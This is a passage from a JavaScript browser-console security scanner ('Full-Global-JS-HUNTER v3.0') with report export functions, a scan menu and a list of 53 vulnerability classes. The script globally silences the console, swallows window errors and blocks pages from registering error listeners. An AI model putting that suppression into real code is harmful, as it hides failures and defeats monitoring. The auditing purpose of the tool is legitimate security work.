        this._downloadFile(json, `security-audit-${hostname}-${Date.now()}.json`, 'application/json');
        return data.summary;
    }

    exportCSV() {
        const findings = this._collectExportFindings();
        const headers = ['Severity', 'Feature', 'Source', 'Line', 'Code', 'Description', 'Pattern'];
        const escapeCSV = (val) => {
            if (val === null || val === undefined) return '';
            const str = String(val);
            if (str.includes(',') || str.includes('"') || str.includes('\n')) {
                return `"${str.replace(/"/g, '""')}"`;
            }
            return str;
        };
        let csv = headers.join(',') + '\n';
        findings.forEach(f => {
            csv += [
                escapeCSV(f.severity),
                escapeCSV(f.feature || f.vulnerability),
                escapeCSV(f.source || f.fullSource || ''),
                escapeCSV(f.line || ''),
                escapeCSV((f.code || '').replace(/\n/g, ' ')),
                escapeCSV(f.description || ''),
                escapeCSV(f.pattern_matched?.[0] || '')
            ].join(',') + '\n';
        });
        const hostname = window.location.hostname.replace(/[^a-z0-9]/gi, '_');
        this._downloadFile(csv, `security-audit-${hostname}-${Date.now()}.csv`, 'text/csv');
        return { total: findings.length, filename: `security-audit-${hostname}-${Date.now()}.csv` };
    }

    exportMD() {
        const findings = this._collectExportFindings();
        const hostname = window.location.hostname;
        const url = window.location.href;
        const ts = new Date().toISOString();
        const critCount = findings.filter(f => f.severity === 'CRITICAL').length;
        const highCount = findings.filter(f => f.severity === 'HIGH').length;
        const medCount = findings.filter(f => f.severity === 'MEDIUM').length;
        const lowCount = findings.filter(f => f.severity === 'LOW' || f.severity === 'INFO').length;

        let md = `# Security Audit Report\n\n`;
        md += `**URL:** ${url}  \n`;
        md += `**Date:** ${ts}  \n`;
        md += `**Tool:** Full-Global-JS-HUNTER v3.0  \n\n`;
        md += `## Summary\n\n`;
        md += `| Severity | Count |\n|----------|-------|\n`;
        md += `| CRITICAL | ${critCount} |\n`;
        md += `| HIGH | ${highCount} |\n`;
        md += `| MEDIUM | ${medCount} |\n`;
        md += `| LOW/INFO | ${lowCount} |\n`;
        md += `| **Total** | **${findings.length}** |\n\n`;

        if (findings.length === 0) {
            md += `No vulnerabilities found.\n`;
        } else {
            md += `## Findings\n\n`;
            const sevOrder = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 };
            findings.sort((a, b) => (sevOrder[a.severity] || 5) - (sevOrder[b.severity] || 5));
            findings.forEach((f, i) => {
                const badge = f.severity === 'CRITICAL' ? '🔴' : f.severity === 'HIGH' ? '🟠' : f.severity === 'MEDIUM' ? '🟡' : '⚪';
                md += `### ${badge} ${i + 1}. ${f.feature || f.vulnerability || 'Unknown'}\n\n`;
                md += `- **Severity:** ${f.severity}\n`;
                if (f.source || f.fullSource) md += `- **Source:** \`${f.fullSource || f.source}\`\n`;
                if (f.line) md += `- **Line:** ${f.line}\n`;
                if (f.code) md += `- **Code:** \`${f.code.substring(0, 120)}\`\n`;
                md += `- **Description:** ${f.description}\n`;
                if (f.pattern_matched?.[0]) md += `- **Pattern:** \`${f.pattern_matched[0]}\`\n`;
                if (f.context && f.context.length > 0) {
                    md += `\n\`\`\`javascript\n`;
                    f.context.forEach(ctx => {
                        const marker = ctx.highlight ? '>> ' : '   ';
                        md += `${marker}${ctx.line}: ${ctx.code}\n`;
                    });
                    md += `\`\`\`\n`;
                }
                md += `\n`;
            });
        }

        md += `---\n*Generated by Full-Global-JS-HUNTER v3.0*\n`;
        const host = hostname.replace(/[^a-z0-9]/gi, '_');
        this._downloadFile(md, `security-audit-${host}-${Date.now()}.md`, 'text/markdown');
        return { total: findings.length, filename: `security-audit-${host}-${Date.now()}.md` };
    }

    // ═══════════════════════════════════════════════════════════════════
    // 📊 ENHANCED REPORT
    // ═══════════════════════════════════════════════════════════════════
    generateEnhancedReport() {
        return this.generateDetailedReport();
    }
}

// 🚀 ULTRA-SILENT PROFESSIONAL JAVASCRIPT VULNERABILITY HUNTER
// Complete suppression of all console output for clean professional use

// IMMEDIATE COMPLETE SILENCE - Override ALL console methods before anything else
const originalConsoleMethods = {
    log: console.log,
    error: console.error,
    warn: console.warn,
    info: console.info,
    debug: console.debug,
    clear: console.clear,
    table: console.table,
    group: console.group,
    groupEnd: console.groupEnd,
    groupCollapsed: console.groupCollapsed
};

// Replace ALL console methods with ultra-silent versions
Object.keys(originalConsoleMethods).forEach(key => {
    console[key] = function(...args) {
        // Only show menu-related messages when explicitly needed
        return;
    };
});

// Override global error handlers immediately (silent mode)
const originalOnError = window.onerror;
const originalOnUnhandledRejection = window.onunhandledrejection;
window.onerror = function() { return true; };
window.onunhandledrejection = function() { return true; };

// Override addEventListener to suppress unhandled promise rejections (with re-entry guard)
const _originalAddEventListener = window.addEventListener.bind(window);
let _addEventListenerOverridden = false;
if (!_addEventListenerOverridden) {
    _addEventListenerOverridden = true;
    window.addEventListener = function(type, listener, options) {
        if (type === 'unhandledrejection' || type === 'error') {
            return;
        }
        return _originalAddEventListener(type, listener, options);
    };
}

// Initialize with ultra-quiet mode for professional use
const professionalHunter = new CompleteJSVulnHunter({quiet: true});
window.JSHunter = professionalHunter;

// Create nested JS object for advanced usage
window.JSHunter.JS = {
    runScan: async function(options) {
        // Parse options - can be single number or comma-separated
        let optionList = [];
        if (typeof options === 'string') {
            optionList = options.split(',').map(opt => parseInt(opt.trim())).filter(opt => !isNaN(opt));
        } else if (typeof options === 'number') {
            optionList = [options];
        } else if (Array.isArray(options)) {
            optionList = options;
        }

        if (optionList.length === 0) {
            return null;
        }

        const results = {};

        for (const option of optionList) {
            try {
                switch(option) {
                    case 1:
                        results.instant = window.JSHunter.instantScan();
                        break;
                    case 2:
                        results.fast = await window.JSHunter.fastHunt(15000);
                        break;
                    case 3:
                        results.full = await window.JSHunter.hunt();
                        break;
                    case 4:
                        results.custom = { message: 'Use window.JSHunter.searchVulnerability(type)' };
                        break;
                }
            } catch (error) {
                // Silent error handling
            }
        }

        window.JS_MULTI_RESULTS = results;
        return results;
    },

    // Quick access methods
    instant: () => window.JSHunter.JS.runScan(1),
    fast: () => window.JSHunter.JS.runScan(2),
    full: () => window.JSHunter.JS.runScan(3),
    custom: () => window.JSHunter.JS.runScan(4)
};

// Create JSFILE object for user choice based scanning
window.JSHunter.JSFILE = {
    // INTERACTIVE WORKFLOW: Collect & Display -> User Choice -> Scan
    interactive: async () => window.JSHunter.interactiveHunt(),

    runScan: async function(options) {
        // Parse options - can be single number or comma-separated
        let optionList = [];
        if (typeof options === 'string') {
            optionList = options.split(',').map(opt => parseInt(opt.trim())).filter(opt => !isNaN(opt));
        } else if (typeof options === 'number') {
            optionList = [options];
        } else if (Array.isArray(options)) {
            optionList = options;
        }

        if (optionList.length === 0) {
            return null;
        }

        const results = {};

        for (const option of optionList) {
            try {
                switch(option) {
                    case 1:
                        results.instant = window.JSHunter.instantScan();
                        break;
                    case 2:
                        results.fast = await window.JSHunter.fastHunt(15000);
                        break;
                    case 3:
                        results.full = await window.JSHunter.hunt();
                        break;
                    case 4:
                        results.custom = { message: 'Use window.JSHunter.searchVulnerability(type)' };
                        break;
                }
            } catch (error) {
                // Silent error handling
            }
        }

        window.JSFILE_MULTI_RESULTS = results;
        return results;
    },

    // Quick access methods
    instant: () => window.JSHunter.JSFILE.runScan(1),
    fast: () => window.JSHunter.JSFILE.runScan(2),
    full: () => window.JSHunter.JSFILE.runScan(3),
    custom: () => window.JSHunter.JSFILE.runScan(4),
    fullAudit: async () => await window.JSHunter.runFullAudit(),

    // Individual feature access
    dom: () => window.JSHunter.auditDOMSecurity(),
    csp: () => window.JSHunter.analyzeCSP(),
    cookies: () => window.JSHunter.auditCookieSecurity(),
    storage: () => window.JSHunter.auditStorageSecurity(),
    sri: () => window.JSHunter.checkSubresourceIntegrity(),
    thirdParty: () => window.JSHunter.scoreThirdPartyScripts(),
    urls: () => window.JSHunter.extractURLsFromScripts(),
    forms: () => window.JSHunter.auditFormSecurity(),
    iframes: () => window.JSHunter.auditIframeSecurity(),
    jsURLs: () => window.JSHunter.auditJavascriptURLs(),
    redirects: () => window.JSHunter.detectOpenRedirects(),
    mixed: () => window.JSHunter.detectMixedContent(),
    clobbering: () => window.JSHunter.detectDOMClobbering(),
    ws: () => window.JSHunter.analyzeWebSocketSecurity(),
    permissions: () => window.JSHunter.monitorPermissions(),
    graph: () => window.JSHunter.buildDependencyGraph(),
    exploits: () => window.JSHunter.generateExploitSuggestions(),
    report: () => window.JSHunter.downloadHTMLReport(),
    exportJSON: () => window.JSHunter.exportJSON(),
    exportCSV: () => window.JSHunter.exportCSV(),
    exportMD: () => window.JSHunter.exportMD(),
    diff: (key) => window.JSHunter.compareScans(key),
    monitor: (cb) => window.JSHunter.startDOMMonitor(cb),
    stopMonitor: () => window.JSHunter.stopDOMMonitor(),

    // List all features
    features: [
        'SCAN:    runScan(1|2|3)  fullAudit()  interactive()',
        'EXPORT:  report(HTML)  exportJSON  exportCSV  exportMD',
        'UTILS:   features  searchVulnerability(type)  getSourceCode(file,line)',
        '         getFixSuggestions(type)  updateConfig(opts)',
        '',
        '═══ 53 VULNERABILITY CLASSES ═══',
        '───────────────────────────────────────────',
        'CLIENT-SIDE (8):',
        '  1.  DOM-Based XSS',
        '  2.  Code Execution',
        '  3.  Event Handler Injection',
        '  4.  Client-Side Injection',
        '  5.  PostMessage XSS',
        '  6.  Clickjacking',
        '  7.  Insecure Storage',
        '  8.  Insecure Random',
        '',
        'AUTH & ACCESS (8):',
        '  9.  Broken Access Control',
        '  10. IDOR',
        '  11. CSRF Token Bypass',
        '  12. OAuth/OIDC Vulnerabilities',
        '  13. Type Coercion Auth Bypass',
        '  14. JWT Manipulation',
        '  15. Password Reset Flaws',
        '  16. Timing Side-Channel',
        '',
        'INJECTION (7):',
        '  17. SQL Injection',
        '  18. NoSQL Injection',
        '  19. Command Injection',
        '  20. Server-Side Template Injection',
        '  21. Server-Side Include (SSI) Injection',
        '  22. XML External Entity (XXE)',
        '  23. Prototype Pollution',
        '',
        'DATA & FILE (5):',
        '  24. Sensitive Data Exposure',
        '  25. Path Traversal',
        '  26. Insecure Direct File Download',
        '  27. Insecure File Upload',
        '  28. Deserialization',
        '',
        'NETWORK (6):',
        '  29. SSRF',
        '  30. CORS Misconfiguration',
        '  31. CORS Origin Reflection',
        '  32. HTTP Header Injection',
        '  33. Open Redirect',
        '  34. Client-Side Redirect Manipulation',
        '',
        'FRAMEWORKS (7):',
        '  35. React Security Issues',
        '  36. Next.js Security Issues',
        '  37. Vue.js Security Issues',
        '  38. Angular Security Issues',
        '  39. Framework Deserialization Issues',
        '  40. Modern Framework Injection',
        '  41. Sandbox Escape (Node.js vm)',
        '',
        'NODEJS & INFRA (8):',
        '  42. Node.js Security Issues',
        '  43. GraphQL Security',
        '  44. Business Logic Flaws',
        '  45. Race Condition',
        '  46. ReDoS (Regex Denial of Service)',
        '  47. Log Injection',
        '  48. Memory Safety (Buffer Overflow)',
        '  49. Subresource Integrity (SRI) Bypass',
        '',
        'CLOUD & WEB3 (6):',
        '  50. Serverless Security Issues',
        '  51. Container Security Issues',
        '  52. Web3 Security Issues',
        '  53. Supply Chain Security Issues',
        '───────────────────────────────────────────',
        '',
        '═══ 20 AUDIT MODULES ═══',
        '───────────────────────────────────────────',
        'DOM:     dom  redirects  forms  iframes  jsURLs  clobbering',
        'HEADERS: csp  mixed  ws  sri  permissions',
        'STORAGE: cookies  storage',
        'INTEL:   thirdParty  urls  graph  diff  exploits',
        'MONITOR: monitor(cb)  stopMonitor',
        '───────────────────────────────────────────'
    ]
};

// INSTANT SCAN FIRST (Completely silent)
const instantReport = professionalHunter.instantScan();
window.INSTANT_REPORT = instantReport;

// Add professional scan runner (silent)
window.JSHunter.runScan = async function(option) {
    switch(option) {
        case 1:
            return this.instantScan();
        case 2:
            return await this.fastHunt(15000);
        case 3:
            return await this.hunt();
        case 4:
            return { message: 'Use window.JSHunter.searchVulnerability(type)' };
        default:
            return null;
    }
};

// Start silent comprehensive scan in background
setTimeout(async () => {
    try {
        const report = await professionalHunter.fastHunt(15000);
        window.HUNT_REPORT = report;
    } catch (error) {
        // Completely silent
    }
}, 500);

// Show professional menu after a brief delay
setTimeout(() => {
    // Use a temporary console override just for the menu
    const tempLog = console.log;
    console.log = function(...args) {
        // Only allow our menu messages through
        const message = args.join(' ');
        if (message.includes('🎯') || message.includes('📋') || message.includes('✅') ||
            message.includes('💡') || message.includes('🔧') || message.includes('📊') ||
            message.includes('🔍') || message.includes('📄') || message.includes('🎯')) {
            tempLog.apply(console, args);
        }
    };

    console.log('');
    console.log('  ╔═══════════════════════════════════════════════════════════════════╗');
    console.log('  ║     FULL-GLOBAL-JS-HUNTER v3.0  —  SECURITY AUDIT SUITE        ║');
    console.log('  ║     Hardened Edition • 20 Audit Modules • 53 Vuln Classes       ║');
    console.log('  ╚═══════════════════════════════════════════════════════════════════╝');
    console.log('');
    console.log('  ┌─ PATTERN SCAN (53 vulnerability classes) ─────────────────────────┐');
    console.log('  │  window.JSHunter.JSFILE.runScan(1)   Instant (inline only)       │');
    console.log('  │  window.JSHunter.JSFILE.runScan(2)   Fast (~15s)                 │');
    console.log('  │  window.JSHunter.JSFILE.runScan(3)   Full (all scripts)          │');
    console.log('  └──────────────────────────────────────────────────────────────────┘');
    console.log('');
    console.log('  ┌─ SECURITY AUDIT (20 modules) ────────────────────────────────────┐');
    console.log('  │  await window.JSHunter.JSFILE.fullAudit()   Run everything       │');
    console.log('  │                                                                   │');
    console.log('  │  DOM:     dom  redirects  forms  iframes  jsURLs  clobbering     │');
    console.log('  │  Headers: csp  mixed  ws  sri  permissions                        │');
    console.log('  │  Storage: cookies  storage                                        │');
    console.log('  │  Intel:   thirdParty  urls  graph  diff  exploits                 │');
    console.log('  │  Monitor: monitor(cb)  stopMonitor                                │');
    console.log('  └──────────────────────────────────────────────────────────────────┘');
    console.log('');
    console.log('  ┌─ NEW CLASSES (53 total) ─────────────────────────────────────────┐');
    console.log('  │  OAuth/OIDC  NoSQLi  Mass Assignment  Type Coercion  Sandbox    │');
    console.log('  │  GraphQL  XXE  File Download  PostMessage  Timing  Header Inj   │');
    console.log('  │  Business Logic  ReDoS  CORS Reflect  Password Reset  SSI       │');
    console.log('  │  Memory Safety  Log Injection  Client Redirect  SRI Bypass      │');
    console.log('  └──────────────────────────────────────────────────────────────────┘');
    console.log('');
    console.log('  ┌─ EXPORT ─────────────────────────────────────────────────────────┐');
    console.log('  │  window.JSHunter.JSFILE.exportJSON()    Download as JSON         │');
    console.log('  │  window.JSHunter.JSFILE.exportCSV()     Download as CSV          │');
    console.log('  │  window.JSHunter.JSFILE.exportMD()      Download as Markdown     │');
    console.log('  │  window.JSHunter.JSFILE.report()        Download as HTML          │');
    console.log('  └──────────────────────────────────────────────────────────────────┘');
    console.log('');
    console.log('  ┌─ UTILITIES ──────────────────────────────────────────────────────┐');
    console.log('  │  window.JSHunter.JSFILE.features      List all features          │');
    console.log('  │  window.JSHunter.searchVulnerability(type)  Search by class      │');
    console.log('  │  window.JSHunter.getSourceCode(file, line)  View context         │');
    console.log('  │  window.JSHunter.getFixSuggestions(type)    Fix guidance          │');
    console.log('  │  window.FULL_AUDIT  window.INSTANT_REPORT  window.HUNT_REPORT    │');
    console.log('  └──────────────────────────────────────────────────────────────────┘');
    console.log('');

    // Restore full silence after menu display
    setTimeout(() => {
        console.log = () => {};
    }, 5000);
}, 2000);

// ============================================================================
// 🙏 THANKS & ACKNOWLEDGMENTS
// ============================================================================
// This vulnerability hunting system was created to help security researchers,
// developers, and organizations identify and fix JavaScript security issues.
// 
// Special thanks to:
// - OWASP (Open Web Application Security Project) for vulnerability definitions
// - Mozilla Observatory for security best practices
// - Chrome Security Team for browser security insights
// - Node.js Security Working Group
// - The entire open-source security community
//
// Disclaimer: Use this tool responsibly and only on systems you own or have
// explicit permission to test. Security testing without authorization is illegal.
//
// Version: 3.0.0 (Hardened + 20 Audit Modules)
// Last Updated: 2026-06-27
// ============================================================================
